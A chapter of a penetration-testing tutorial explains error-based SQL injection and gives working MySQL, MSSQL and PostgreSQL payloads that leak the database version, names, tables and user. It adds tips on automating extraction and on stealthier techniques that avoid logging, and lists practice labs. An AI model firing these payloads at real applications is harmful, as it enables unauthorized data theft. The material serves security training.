# Chapter 07 — Error-Based SQL Injection

## About the Topic
The most straightforward SQLi type: the application displays raw database
error messages in its response. Attackers craft payloads that intentionally
throw errors **containing the data they want to extract**, using functions
that force the DB to embed a query result inside its own error text.

**When to use it:** database errors are visible in the page response — best
for quick enumeration during a pentest/CTF.

## Practical Example — MySQL Error-Based Payloads

```sql
-- Extract database version
1 AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))

-- Extract current database name
1 AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE()))

-- Extract table names from information_schema
1 AND EXTRACTVALUE(1, CONCAT(0x7e,
  (SELECT table_name FROM information_schema.tables
   WHERE table_schema=DATABASE() LIMIT 0,1)))

-- Alternative using UPDATEXML
1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)
```

`0x7e` is the hex code for `~`, used as a visual delimiter so the leaked
data stands out clearly in the error message. `EXTRACTVALUE`/`UPDATEXML`
throw an XPATH syntax error when given malformed input, and MySQL embeds
the offending fragment (your subquery result) directly in that error.

### MSSQL example
```sql
1 AND 1=CONVERT(int, (SELECT @@version))
```

### PostgreSQL example
```sql
1 AND 1=CAST((SELECT version()) AS int)
```

## Offensive Tips
- `LIMIT 0,1`, `LIMIT 1,1`, etc. let you page through multiple rows one at
  a time when the error can only show one value per request — script this
  loop rather than doing it by hand.
- Error-based is noisy and easily logged/alerted on — for stealthier
  engagements prefer blind techniques (Ch. 08–09).
- Always confirm the exact DBMS first (Ch. 11) — error-based syntax is
  DBMS-specific and won't transfer between MySQL/MSSQL/PostgreSQL/Oracle.

## Labs to Practice
- **PortSwigger Academy** — "Examining the database" labs (error-based
  techniques for extracting version/table info).
- **TryHackMe** — *SQL Injection* room, error-based extraction task.
- **DVWA** — SQLi module at Low security shows raw MySQL errors by default.

## Key Takeaway
Error-based SQLi turns the database's own error-reporting into a covert
data channel — fast, but loud and DBMS-specific.
